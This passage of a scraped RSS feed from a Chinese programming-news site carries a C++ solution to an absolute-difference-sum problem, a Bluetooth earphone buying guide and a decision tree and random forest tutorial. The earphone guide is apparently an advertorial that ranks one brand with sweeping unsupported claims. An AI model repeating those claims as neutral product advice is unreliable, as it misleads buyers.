物体识别分类&amp;#xff0c;pytorch 目前数据集 
包括 1&amp;#xff09;Stanford Dogs 数据集 &amp;#xff0c; 
2&amp;#xff09;14类静态手势自建数据集&amp;#xff0c; 
3&amp;#xff09;imagenet 1000类数据集 
classifica…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:23 +0000</pubDate>
    </item>
    <item>
      <title>绝对差值的和</title>
      <link>https://www.ppmy.cn/news/1540907.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维绝对差值的和news/2025/10/31 23:19:22/问题分析：取模操作的位置不正确：你在计算result - max_之前没有正确处理大数取模，这可能导致数值溢出。最大差值减少量的计算：算法中的内部循环效率较低，可以优化。优化后的代码：我们可以参考官方题解，优化算法并确保取模操作的正确性。classSolution{public:intminAbsoluteSumDiff(vector&lt;int&gt;&amp;nums1,vector&lt;int&gt;&amp;nums2){intlength_=nums1.size();longresult=0;longmax_=0;// 先计算初始的绝对差值和for(inti=0;i&lt;length_;i++){result+=abs(nums1[i]-nums2[i]);}// 找到可以替换的最大差值减少量vector&lt;int&gt;sorted_nums1=nums1;sort(sorted_nums1.begin(),sorted_nums1.end());for(inti=0;i&lt;length_;i++){intoriginal_diff=abs(nums1[i]-nums2[i]);autoit=lower_bound(sorted_nums1.begin(),sorted_nums1.end(),nums2[i]);intnew_diff=original_diff;if(it!=sorted_nums1.end()){new_diff=min(new_diff,abs(*it-nums2[i]));}if(it!=sorted_nums1.begin()){new_diff=min(new_diff,abs(*prev(it)-nums2[i]));}max_=max(max_,original_diff-new_diff);}return(int)((result-max_)%1000000007);}};详细解释优化后的代码：计算初始绝对差值和：for(inti=0;i&lt;length_;i++){result+=abs(nums1[i]-nums2[i]);}首先计算nums1和nums2每个对应元素的绝对差值的和。对nums1进行排序：vector&lt;int&gt;sorted_nums1=nums1;sort(sorted_nums1.begin(),sorted_nums1.end());为了更高效地找到可以替换的元素，我们对nums1进行排序。遍历每个元素并尝试找到最佳替换：for(inti=0;i&lt;length_;i++){intoriginal_diff=abs(nums1[i]-nums2[i]);autoit=lower_bound(sorted_nums1.begin(),sorted_nums1.end(),nums2[i]);intnew_diff=original_diff;if(it!=sorted_nums1.end()){new_diff=min(new_diff,abs(*it-nums2[i]));}if(it!=sorted_nums1.begin()){new_diff=min(new_diff,abs(*prev(it)-nums2[i]));}max_=max(max_,original_diff-new_diff);}对于每个nums2[i]，使用二分查找在排序后的nums1中找到最接近的元素，并计算替换后的新差值。更新最大差值减少量max_。计算最终结果并取模：return(int)((result-max_)%http://www.ppmy.cn/news/1540907.html相关文章适合学生党的平价蓝牙耳机有哪些？四款便宜又好的蓝牙耳机盘点在寻找适合学生党的平价蓝牙耳机时&amp;#xff0c;我们总是希望能在有限的预算内找到性能卓越、品质可靠的产品&amp;#xff0c;毕竟&amp;#xff0c;对于学生而言&amp;#xff0c;性价比是选择耳机时的重要考量因素&amp;#xff0c;那么适合学生党的平价蓝牙耳机有哪些&amp;#xff1f;市面上琳琅满目…阅读更多...【人工智能-初级】第6章 决策树和随机森林：浅显易懂的介绍及Python实践文章目录 一、决策树简介二、决策树的构建原理2.1 决策树的优缺点优点缺点 三、随机森林简介3.1 随机森林的构建过程3.2 随机森林的优缺点优点缺点 四、Python实现决策树和随机森林4.1 导入必要的库4.2 加载数据集并进行预处理4.3 创建决策树模型并进行训练4.4 可视化决策树4.5…阅读更多...电子商务网站维护技巧：保持WordPress、主题和插件的更新在这个快节奏的数字时代&amp;#xff0c;维护一个电子商务网站的首要任务之一是保持WordPress、主题和插件的最新状态。过时的软件不仅可能导致功能故障&amp;#xff0c;还可能带来安全风险。本文将深入探讨如何有效地更新和维护您的WordPress网站&amp;#xff0c;以确保其安全性和性能。 
…阅读更多...Dockerfile 中 Expose 命令的作用Dockerfile 中 Expose 命令的作用 
格式是&amp;#xff1a;EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...] 
例如&amp;#xff1a; EXPOSE 8080 8081 8082 
特别注意&amp;#xff1a; 
EXPOSE 指令是声明容器运行时提供服务的端口&amp;#xff0c;请注意这只是一个声明&amp;#xff0c;并没有实际作用&amp;am…阅读更多...中阳金融市场中的风险管理与投资优化策略在全球经济波动性不断加剧的背景下&amp;#xff0c;金融市场的复杂性与不确定性显著增加。作为国际金融市场中的重要组成部分&amp;#xff0c;中阳金融市场吸引了大量投资者的关注。面对风险与机遇并存的市场环境&amp;#xff0c;如何合理制定风险管理与投资优化策略&amp;#xff0c;成为投资者…阅读更多...PP-ChatOCRv3—文档场景信息抽取v3产线使用教程文档场景信息抽取v3产线使用教程 
1. 文档场景信息抽取v3产线介绍 
文档场景信息抽取v3&amp;#xff08;PP-ChatOCRv3&amp;#xff09;是飞桨特色的文档和图像智能分析解决方案&amp;#xff0c;结合了 LLM 和 OCR 技术&amp;#xff0c;一站式解决版面分析、生僻字、多页 pdf、表格、印章识别等常…阅读更多...简单易用的分类任务开源项目 ：classification项目地址&amp;#xff1a;https://gitcode.net/EricLee/classification 
物体识别分类&amp;#xff0c;pytorch 目前数据集 
包括 1&amp;#xff09;Stanford Dogs 数据集 &amp;#xff0c; 
2&amp;#xff09;14类静态手势自建数据集&amp;#xff0c; 
3&amp;#xff09;imagenet 1000类数据集 
classifica…阅读更多...从传统到智能，从被动监控到主动预警，解锁视频安防平台EasyCVR视频监控智能化升级的关键密钥视频监控技术从传统监控到智能化升级的过程是一个技术革新和应用场景拓展的过程。智能视频监控系统通过集成AI和机器学习算法&amp;#xff0c;能够实现行为分析、人脸识别和异常事件检测等功能&amp;#xff0c;提升了监控的准确性和响应速度。这些系统不仅用于传统的安全防护&amp;#xff0…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:22 +0000</pubDate>
    </item>
    <item>
      <title>适合学生党的平价蓝牙耳机有哪些？四款便宜又好的蓝牙耳机盘点</title>
      <link>https://www.ppmy.cn/news/1540906.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维适合学生党的平价蓝牙耳机有哪些？四款便宜又好的蓝牙耳机盘点news/2025/10/31 23:19:21/在寻找适合学生党的平价蓝牙耳机时，我们总是希望能在有限的预算内找到性能卓越、品质可靠的产品，毕竟，对于学生而言，性价比是选择耳机时的重要考量因素，那么适合学生党的平价蓝牙耳机有哪些？市面上琳琅满目的蓝牙耳机品牌与型号，让人眼花缭乱，但总有一些产品凭借其出色的性能和亲民的价格脱颖而出，接下来我将带来四款便宜又好的蓝牙耳机盘点，它们不仅适合学生党，也能满足大多数人对音质和舒适度的基本需求。一、好用靠谱的蓝牙耳机五大挑选指南许多消费者反映，他们购买的蓝牙耳机在使用体验上存在诸多问题，如音效不佳、音质差、质量不可靠以及严重的漏音现象，这些都是劣质产品的典型表现。基于我对蓝牙耳机的深入测评与分析，我为大家总结了以下五个实用的选购技巧，旨在帮助大家在2024年的众多蓝牙耳机品牌中迅速筛选出既安全又高效的产品。挑选指南一：选择有实力的品牌耳机作为日常频繁使用的电子产品，耐用性至关重要。为了确保长久的使用体验，选择专业品牌且拥有良好口碑的蓝牙耳机尤为重要，这样能有效保障产品的质量和耐用性。一款耐用的蓝牙耳机能减少维修和更换的频率，从而延长其使用寿命，稳定音质。挑选指南一：选择佩戴舒适度的耳机特别是对于需要长时间佩戴耳机的用户来说，不舒适的佩戴体验可能导致耳朵疼痛、红肿甚至听力受损。选择一款佩戴舒适的蓝牙耳机至关重要。辨别蓝牙耳机佩戴是否舒适，关键在于综合考虑多个方面。首先，耳机的重量要轻，以减少对耳朵的压迫感。其次，材质的选择也很重要，柔软亲肤且透气性好的材质能提升佩戴的舒适度。再者，人体工学设计能够适配不同耳型，确保耳机稳固贴合且减少不适感。此外，亲自试戴以感受实际佩戴效果，并参考其他用户的评价，也是判断蓝牙耳机佩戴舒适度的重要参考依据。挑选指南一：选择音质听感优秀的耳机在音质方面，最为关键的是考量各品牌耳机是否搭载了先进的声学技术。对于蓝牙耳机耳机的挑选，尤为重要的是确认其是否拥有独特的专利声学技术。这些专利技术可能涵盖驱动单元的创新设计、精细的声学调音工艺以及优化的无线传输技术等。例如，西圣品牌就凭借其自主研发的专利技术，为用户提供了更加卓越的音质体验。鉴于当前蓝牙耳机耳机市场品牌众多、质量参差不齐，为了规避选择风险，建议消费者优先考虑那些拥有深厚研发实力、并已成功申请多项专利技术的品牌。这样的品牌往往能在音质方面提供更为出色的表现。挑选指南一：选择蓝牙版本高的耳机在挑选耳机时，蓝牙版本至关重要，因为它直接关系到耳机的性能和功能。较新的蓝牙版本往往带来更为稳定的连接与迅捷的数据传输速度，从而显著减少音频中断或延迟现象。因此，我强烈推荐大家选择蓝牙5.3及以上版本的耳机，以确保连接的稳定性与使用的顺畅性。而对于游戏爱好者而言，选购内置游戏模式的耳机更是明智之举，它能进一步优化游戏体验，体验感会更好。挑选指南一：选续航能力长的耳机续航能力受耳机电池、蓝牙芯片版本、音量设置及多种使用条件共同影响。在挑选蓝牙耳机耳机时，应基于个人日常使用习惯与需求来评估其续航表现。为享受无忧的长时间音乐体验，避免电量不足带来的焦虑及频繁充电的不便，推荐选择总续航时间超过30小时的耳机是最为合适的。——为了降低大家在选购过程中可能遭遇的试错成本，我强烈建议大家依据前面提到的选购技巧来筛选蓝牙耳机。接下来，我将分享一些蓝牙耳机的测评内容，这些测评不仅基于我个人的使用体验，还综合了专业机构对蓝牙耳机的深度测评数据。在此，我特别推荐四款便宜又好的蓝牙耳机盘点，希望我的推荐以及这些测评数据能成为大家选购蓝牙耳机时的有力参考。二、适合学生党的平价蓝牙耳机有哪些？四款便宜又好的蓝牙耳机盘点1、西圣AVA2蓝牙耳机售价：129￥佩戴方式：半入耳式推荐星级：★★★★★一句点评：百元性价比蓝牙耳机首选，军工级品质一流用料，发烧级音质表现，音质性价比标杆品牌！适合学生党的平价蓝牙耳机有哪些？这款西圣AVA2耳机品牌是国内少有的因技术闻名的耳机厂商，在音视频解析上有十多年的经验积累，它在数码极客圈里拥有很高的名气，工艺水准特别高，完全不输大牌耳机。而且对音质的调试要求更高，从重金搭建国内罕见的高标准声学实验室就可见一般，真的是在追求平价蓝牙耳机中的音质。西圣AVA2蓝牙耳机的配置一百多的这个价位可以说是顶配的标准，虽然价格便宜，在质量方面严格把控，把每个看不到的细节都要做好，用品质和体验赢得用户的信任！选择的都是进口级的材料，而且还有多达80余项高强度品质检测过程，比一般普通蓝牙耳机多二倍的检测工序，品质做工都没话说。西圣AVA2在音质的打磨上，可以说是业界良心了，耳机采用了三重实时听感优化和13mm双声环聚能声音单元，再加上Tri-Auro全景音频矩阵，经评测，西圣AVA2的声音具有饱满的紧实感，低音听起来更加醇厚，有很好·的沉浸体验感，高频平实稳当，细腻出彩，中高频声音比较温婉，这个价位的水准性能翘楚！而且音质得到数码界大神们的一致认可，口碑直逼一众国际大牌耳机。西圣AVA2就是抓住极致舒适度的体验，特别注重了舒适性的设计，为了减轻耳机的重量，西圣花费了大量时间进行研究，最终成功研发出比常规蓝牙耳机轻60%的产品！此外，产品体积也被设计得+非常小巧，再加上独特的Buoyancy工学设计，让它真正做到了空气感舒适佩戴，有多达500多位的专业测评师给它的评价都是佩戴舒适度方面最高！大部分蓝牙耳机在游戏时使用都会有很明显的延迟，但西圣不会，全新的蓝牙5.3方案，加强了抗干扰能力和连接稳定性，游戏模式下延时低至65ms，用它来玩游戏能做到音画同步，非常适合游戏党使用！超长续航30小时，好声音一直听，配置非常能打，不存在对手!2、漫 步 者Lolli Pro2蓝牙耳机售价：389￥佩戴方式：入耳式推荐星级：★★★★★一句点评：漫步者Lolli Pro2小巧轻便，有LDAC加持，高品质音质传输。适合学生党的平价蓝牙耳机有哪些？这款耳机小巧轻便，外观上更加符合人体工学设计，附赠了大中小三种不同尺寸的抗菌耳套，不仅舒适，而且健康，佩戴体验感很不错。LDAC高清音频传输协议确保了优秀的音乐体验，音质采用了发烧级别的同轴双动圈声学架构，中高音宽广明亮，低频厚度一般，前后双动圈，整体声场较大，主动降噪技术很不错。漫步者Lolli Pro2蓝牙耳机总续航长达约24小时，适用于日常出行，不用担心耳机没电，还采用了蓝牙V5.3芯片，连接稳定的同时也迅速，支持快充技术，日常通话清晰度也不错，能够还原人声，减少杂音，总体结构实用并且有一定的观赏性，可值得考虑。3、绿 联T6蓝牙耳机售价：279￥佩戴方式：入耳式推荐星级：★★★一句点评：整体通话质量不错的，同时连接手机和电脑都没有问题。适合学生党的平价蓝牙耳机有哪些？这款耳机虽然是很常见的柱式入耳式设计，但是它的机身和充电盒都设计的非常轻量，不仅拿取很轻松(单手就能操作)，佩戴上耳感受也不错。它的耳套很柔软，入耳较深，佩戴稳定性也可以。支持LDAC高清音频编码格式，同时设计有蓝牙、Hi-Res音频认证标签绿联T6耳机搭载10mm镀钛动圈单元，让耳机发声更清晰，声音衔接也比较自然，但是感觉中低频率不够丰富，整体的使用感受不错。配置了蓝牙5.3芯片，能有效的降低耳机延迟，稳定性还可以，整体通话质量不错的，同时连接手机和电脑都没有问题，续航长达30小时，外出可放心使用。4、J B L T280TWS NC2蓝牙耳机售价：499￥佩戴方式：入耳式推荐星级：★★★一句点评：它的入耳式硅胶耳塞是柔软一些，通过哈曼最佳聆听曲线调音，使得低频表现动感十足。适合学生党的平价蓝牙耳机有哪些？这款耳机拥有灵动的外观设计及人体工学的贴合形态，佩戴舒适感挺好的，耳机上耳舒适度还可以，它的入耳式硅胶耳塞是柔软一些，所以佩戴的体验感受还不错。JBLT280TWS NC2通过哈曼最佳聆听曲线调音，使得低频表现动感十足，中高频清晰悦耳，高音延展性能与音乐细节表现不错，但高频部分的人声呈现不足，具有不错的降噪效果。蓝牙5.2的加持，不论是玩游戏还是听歌，基本上轻度使用足够，对于重度游戏体验存在一些延迟问题，可支持30小时的额外续航，官方标称充电10分钟，听歌2小时，本人在日常的使用中，平时上班的途中听听歌的使用需求还是够的，通过麦克风采集噪音，日常的通话流畅性不错。总结：适合学生党的平价蓝牙耳机有哪些？每位消费者的需求各异，选择自然也应个性化，关键在于信赖大品牌的质量保证与完善的售后服务，这些选购智慧能有效规避潜在风险，在众多蓝牙耳机中，2024年我尤为推崇的是西圣AVA2，这款耳机不仅在音质呈现、佩戴舒适度以及配置性能技术上，展现出了与高端千元级蓝牙耳机相匹敌的实力，更以超乎预期的高性价比，成为了该价位段中，无疑追求性价比用户的理想之选。http://www.ppmy.cn/news/1540906.html相关文章【人工智能-初级】第6章 决策树和随机森林：浅显易懂的介绍及Python实践文章目录 一、决策树简介二、决策树的构建原理2.1 决策树的优缺点优点缺点 三、随机森林简介3.1 随机森林的构建过程3.2 随机森林的优缺点优点缺点 四、Python实现决策树和随机森林4.1 导入必要的库4.2 加载数据集并进行预处理4.3 创建决策树模型并进行训练4.4 可视化决策树4.5…阅读更多...电子商务网站维护技巧：保持WordPress、主题和插件的更新在这个快节奏的数字时代&amp;#xff0c;维护一个电子商务网站的首要任务之一是保持WordPress、主题和插件的最新状态。过时的软件不仅可能导致功能故障&amp;#xff0c;还可能带来安全风险。本文将深入探讨如何有效地更新和维护您的WordPress网站&amp;#xff0c;以确保其安全性和性能。 
…阅读更多...Dockerfile 中 Expose 命令的作用Dockerfile 中 Expose 命令的作用 
格式是&amp;#xff1a;EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...] 
例如&amp;#xff1a; EXPOSE 8080 8081 8082 
特别注意&amp;#xff1a; 
EXPOSE 指令是声明容器运行时提供服务的端口&amp;#xff0c;请注意这只是一个声明&amp;#xff0c;并没有实际作用&amp;am…阅读更多...中阳金融市场中的风险管理与投资优化策略在全球经济波动性不断加剧的背景下&amp;#xff0c;金融市场的复杂性与不确定性显著增加。作为国际金融市场中的重要组成部分&amp;#xff0c;中阳金融市场吸引了大量投资者的关注。面对风险与机遇并存的市场环境&amp;#xff0c;如何合理制定风险管理与投资优化策略&amp;#xff0c;成为投资者…阅读更多...PP-ChatOCRv3—文档场景信息抽取v3产线使用教程文档场景信息抽取v3产线使用教程 
1. 文档场景信息抽取v3产线介绍 
文档场景信息抽取v3&amp;#xff08;PP-ChatOCRv3&amp;#xff09;是飞桨特色的文档和图像智能分析解决方案&amp;#xff0c;结合了 LLM 和 OCR 技术&amp;#xff0c;一站式解决版面分析、生僻字、多页 pdf、表格、印章识别等常…阅读更多...简单易用的分类任务开源项目 ：classification项目地址&amp;#xff1a;https://gitcode.net/EricLee/classification 
物体识别分类&amp;#xff0c;pytorch 目前数据集 
包括 1&amp;#xff09;Stanford Dogs 数据集 &amp;#xff0c; 
2&amp;#xff09;14类静态手势自建数据集&amp;#xff0c; 
3&amp;#xff09;imagenet 1000类数据集 
classifica…阅读更多...从传统到智能，从被动监控到主动预警，解锁视频安防平台EasyCVR视频监控智能化升级的关键密钥视频监控技术从传统监控到智能化升级的过程是一个技术革新和应用场景拓展的过程。智能视频监控系统通过集成AI和机器学习算法&amp;#xff0c;能够实现行为分析、人脸识别和异常事件检测等功能&amp;#xff0c;提升了监控的准确性和响应速度。这些系统不仅用于传统的安全防护&amp;#xff0…阅读更多...RabbitMQ 中的交换机学习RabbitMQ 中的交换机学习 一、直接交换机&amp;#xff08;Direct Exchange&amp;#xff09; 
1. 介绍 
Direct 交换机将消息路由到绑定了指定 Routing Key 的队列中。每条消息都有一个 Routing Key&amp;#xff0c;当队列绑定到 Direct 交换机时&amp;#xff0c;它需要一个指定的 Routing Key。…阅读更多...最新文章品牌故事不会写？这个AI指令可能帮你解决大问题用户上下文透传机制详解[网络] [TCP] Linux UDP Socket 学习指南[网络] [TCP] Linux TCP Socket 学习指南251025B. 海啸HarfBuzz概览DW1000芯片帧组成解析实验课收获2025.10.30Revit Api打印当前项目的所有的可打印视图概率递推1microsoft edge webview离线安装包程序员修炼之道：从小工到专家sunpinyin online的简单例子Ubuntu server配置Docker Daemon.json 顽固不生效Ai元人文：价值权衡元能力的培育路径与开源生态构建revit api 事务和事务组Skill Discovery | RGSD：基于高质量参考轨迹，预训练 skill spacerevit api 过滤器获取元素revit 设置参数revit 设置参数和获取参数值《代码大全2》读书笔记2[Vulhub]Sickos靶机渗透revit api共享参数一件有关山寨iPod shuffle 2的往事revit api  加载族文件+放置族实例 创建门图元【AI说】HTML从零基础到精通路径python 进制、编码《代码大全2》读后感二《代码大全2》读后感三程序员修炼之道：跳出 “小工” 陷阱Amped DVRConv与引擎更新38103：音频转视频容器与解码增强使用 Kotlin 结合 Tesseract OCR 识别验证码Copyright @ 2022~2023</description>
      <pubDate>Fri, 31 Oct 2025 15:19:21 +0000</pubDate>
    </item>
    <item>
      <title>【人工智能-初级】第6章 决策树和随机森林：浅显易懂的介绍及Python实践</title>
      <link>https://www.ppmy.cn/news/1540905.html</link>
      <description>首页编程日记开发工具嵌入式服务器运维【人工智能-初级】第6章 决策树和随机森林：浅显易懂的介绍及Python实践news/2025/10/31 23:19:20/文章目录一、决策树简介二、决策树的构建原理2.1 决策树的优缺点优点缺点三、随机森林简介3.1 随机森林的构建过程3.2 随机森林的优缺点优点缺点四、Python实现决策树和随机森林4.1 导入必要的库4.2 加载数据集并进行预处理4.3 创建决策树模型并进行训练4.4 可视化决策树4.5 创建随机森林模型并进行训练4.6 模型预测与评估五、总结5.1 学习要点5.2 练习题一、决策树简介决策树（Decision Tree）是一种树状结构的监督学习算法，可以用于分类和回归任务。它通过递归地将数据划分成不同的子集，直至每个子集只包含一个类别（对于分类问题）或达到某种特定的条件（对于回归问题）。决策树非常直观，类似于人们在做决定时的思维过程。例如，在判断是否买房时，可能会依次考虑预算、房屋位置和是否满足个人需求等因素。决策树的结构由节点（node）和边（branch）组成，节点表示数据特征，边表示根据特征划分的数据路径。二、决策树的构建原理决策树的构建过程主要包括以下几步：选择特征进行分裂：在每个节点，选择一个特征对数据进行划分，使得划分后的子集之间的纯度（或均匀度）尽可能高。分裂节点：根据选择的特征将数据划分为两个或多个子集。停止条件：递归地对每个子集构建子节点，直至满足停止条件（如树的最大深度，或节点中的样本数小于某个阈值）。在选择特征进行分裂时，通常会使用一些标准来衡量子集的纯度，包括：基尼不纯度（Gini Impurity）：用于衡量节点中样本的混杂程度，值越小表示节点越纯。G = 1 − ∑ i = 1 k p i 2 G = 1 - \sum_{i=1}^{k} p_i^2G=1−i=1∑k​pi2​其中，p_i表示第i类样本的比例。信息增益（Information Gain）：用于衡量使用某个特征划分后的不确定性减少的程度。I G = H ( D ) − ∑ i = 1 m ∣ D i ∣ ∣ D ∣ H ( D i ) IG = H(D) - \sum_{i=1}^{m} \frac{|D_i|}{|D|} H(D_i)IG=H(D)−i=1∑m​∣D∣∣Di​∣​H(Di​)其中，H(D)表示数据集D的熵，|D_i|表示划分后的子集D_i的大小。2.1 决策树的优缺点优点易于理解：决策树的结构简单直观，可以将复杂的决策过程可视化。适应性强：决策树能够处理数值型和类别型特征，并且对数据的预处理要求较低。能够处理多类别问题：决策树可以自然地处理多类别的分类问题。缺点容易过拟合：当决策树的深度过大时，模型容易学习到数据中的噪声，导致过拟合。对小数据变化敏感：由于决策树的每一次划分都会影响后续的结构，数据的轻微变化可能会导致决策树的结构发生较大变化。三、随机森林简介随机森林（Random Forest）是一种集成学习方法，通过结合多个决策树的预测结果来提高分类或回归的性能。它通过随机采样和特征选择来生成多个相互独立的决策树，并将这些决策树的输出通过投票（分类任务）或平均（回归任务）来得到最终的预测结果。3.1 随机森林的构建过程随机采样：从原始数据集中有放回地随机抽取样本，生成多个训练数据集，这一过程称为Bagging（Bootstrap Aggregating）。特征选择：在构建每棵决策树时，随机选择部分特征用于分裂节点，以保证每棵树的多样性。集成决策：对于分类任务，通过投票的方式决定最终分类结果；对于回归任务，通过取平均值来得到最终预测结果。3.2 随机森林的优缺点优点高准确率：由于随机森林结合了多个决策树，能够显著提高模型的准确率和鲁棒性。防止过拟合：随机森林通过随机采样和特征选择，减少了单棵决策树可能出现的过拟合问题。特征重要性：随机森林可以评估每个特征对分类结果的重要性，从而帮助理解数据。缺点计算复杂度高：构建和集成多个决策树需要较高的计算资源和时间。不可解释性：相比单棵决策树，随机森林的结构更复杂，不容易进行可视化和解释。四、Python实现决策树和随机森林接下来我们通过Python来实现决策树和随机森林，使用scikit-learn库来帮助我们完成这一任务。4.1 导入必要的库首先，我们需要导入一些必要的库：importnumpyasnpimportmatplotlib.pyplotaspltfromsklearn.datasetsimportload_irisfromsklearn.model_selectionimporttrain_test_splitfromsklearn.treeimportDecisionTreeClassifier,plot_treefromsklearn.ensembleimportRandomForestClassifierfromsklearn.metricsimportaccuracy_score,confusion_matrix,classification_reportnumpy：用于数值计算。matplotlib：用于数据可视化。sklearn.datasets：用于加载Iris数据集，这是一个经典的多分类数据集。train_test_split：用于将数据集拆分为训练集和测试集。DecisionTreeClassifier：用于创建决策树分类器。RandomForestClassifier：用于创建随机森林分类器。accuracy_score, confusion_matrix, classification_report：用于评估模型的性能。4.2 加载数据集并进行预处理我们使用Iris数据集，这是一个常用的多分类数据集，包含三类花（山鸢尾、变色鸢尾、维吉尼亚鸢尾），每类有50个样本。# 加载Iris数据集data=load_iris()X=data.data
y=data.target# 将数据集拆分为训练集和测试集X_train,X_test,y_train,y_test=train_test_split(X,y,test_size=0.2,random_state=42)load_iris()：加载Iris数据集，X是特征矩阵，y是标签。train_test_split：将数据集拆分为训练集和测试集，20%的数据用于测试。4.3 创建决策树模型并进行训练我们创建一个决策树分类器，并用训练集进行模型训练。# 创建决策树分类器dt=DecisionTreeClassifier(criterion='gini',max_depth=3,random_state=42)# 训练模型dt.fit(X_train,y_train)DecisionTreeClassifier(criterion=‘gini’, max_depth=3)：创建决策树分类器，使用基尼不纯度作为分裂标准，最大深度为3。dt.fit(X_train, y_train)：用训练数据拟合决策树模型。4.4 可视化决策树为了更好地理解决策树的结构，我们可以使用plot_tree方法对其进行可视化。# 可视化决策树plt.figure(figsize=(12,8))plot_tree(dt,filled=True,feature_names=data.feature_names,class_names=data.target_names)plt.show()通过上述代码，我们可以看到决策树的结构，包括每个节点的特征、基尼不纯度、样本数量以及类别分布。4.5 创建随机森林模型并进行训练接下来，我们创建一个随机森林分类器，并用训练集进行模型训练。# 创建随机森林分类器rf=RandomForestClassifier(n_estimators=100,criterion='gini',random_state=42)# 训练模型rf.fit(X_train,y_train)RandomForestClassifier(n_estimators=100, criterion=‘gini’)：创建随机森林分类器，包含100棵决策树，使用基尼不纯度作为分裂标准。rf.fit(X_train, y_train)：用训练数据拟合随机森林模型。4.6 模型预测与评估使用测试集对决策树和随机森林模型分别进行预测，并评估其性能。# 决策树预测y_pred_dt=dt.predict(X_test)accuracy_dt=accuracy_score(y_test,y_pred_dt)print(f"决策树模型的准确率:{accuracy_dt*100:.2f}%")# 随机森林预测y_pred_rf=rf.predict(X_test)accuracy_rf=accuracy_score(y_test,y_pred_rf)print(f"随机森林模型的准确率:{accuracy_rf*100:.2f}%")dt.predict(X_test)和rf.predict(X_test)：分别对测试集进行预测。accuracy_score：计算预测的准确率。我们可以看到随机森林模型的准确率通常比单棵决策树要高，这是因为随机森林通过集成多个决策树的预测结果来提高模型的泛化能力。五、总结决策树是一种简单直观的监督学习算法，可以用于分类和回归任务。它通过递归地将数据划分成不同的子集，直至达到某种特定的条件。随机森林则是通过结合多个决策树来提高模型的性能，是一种强大的集成学习方法。5.1 学习要点决策树原理：决策树通过递归划分数据来建立分类或回归模型，使用基尼不纯度或信息增益来衡量划分的好坏。随机森林原理：随机森林结合了多个决策树，通过随机采样和特征选择来提高模型的准确率和鲁棒性。Python实现：可以使用scikit-learn库中的DecisionTreeClassifier和RandomForestClassifier轻松实现决策树和随机森林。5.2 练习题使用决策树对Iris数据集进行回归任务，观察模型的表现。使用sklearn.datasets模块中的load_wine数据集，构建一个随机森林分类模型，预测葡萄酒的类别。尝试调整决策树和随机森林的参数，如树的最大深度、估计器数量等，观察模型的性能变化。希望本文能帮助您更好地理解决策树和随机森林的基本概念和实现方法。下一篇文章将为您介绍K-Means聚类及其Python实现。如果有任何问题，欢迎在评论中讨论！http://www.ppmy.cn/news/1540905.html相关文章电子商务网站维护技巧：保持WordPress、主题和插件的更新在这个快节奏的数字时代&amp;#xff0c;维护一个电子商务网站的首要任务之一是保持WordPress、主题和插件的最新状态。过时的软件不仅可能导致功能故障&amp;#xff0c;还可能带来安全风险。本文将深入探讨如何有效地更新和维护您的WordPress网站&amp;#xff0c;以确保其安全性和性能。 
…阅读更多...Dockerfile 中 Expose 命令的作用Dockerfile 中 Expose 命令的作用 
格式是&amp;#xff1a;EXPOSE &lt;端口1&gt; [&lt;端口2&gt;...] 
例如&amp;#xff1a; EXPOSE 8080 8081 8082 
特别注意&amp;#xff1a; 
EXPOSE 指令是声明容器运行时提供服务的端口&amp;#xff0c;请注意这只是一个声明&amp;#xff0c;并没有实际作用&amp;am…阅读更多...中阳金融市场中的风险管理与投资优化策略在全球经济波动性不断加剧的背景下&amp;#xff0c;金融市场的复杂性与不确定性显著增加。作为国际金融市场中的重要组成部分&amp;#xff0c;中阳金融市场吸引了大量投资者的关注。面对风险与机遇并存的市场环境&amp;#xff0c;如何合理制定风险管理与投资优化策略&amp;#xff0c;成为投资者…阅读更多...PP-ChatOCRv3—文档场景信息抽取v3产线使用教程文档场景信息抽取v3产线使用教程 
1. 文档场景信息抽取v3产线介绍 
文档场景信息抽取v3&amp;#xff08;PP-ChatOCRv3&amp;#xff09;是飞桨特色的文档和图像智能分析解决方案&amp;#xff0c;结合了 LLM 和 OCR 技术&amp;#xff0c;一站式解决版面分析、生僻字、多页 pdf、表格、印章识别等常…阅读更多...简单易用的分类任务开源项目 ：classification项目地址&amp;#xff1a;https://gitcode.net/EricLee/classification 
物体识别分类&amp;#xff0c;pytorch 目前数据集 
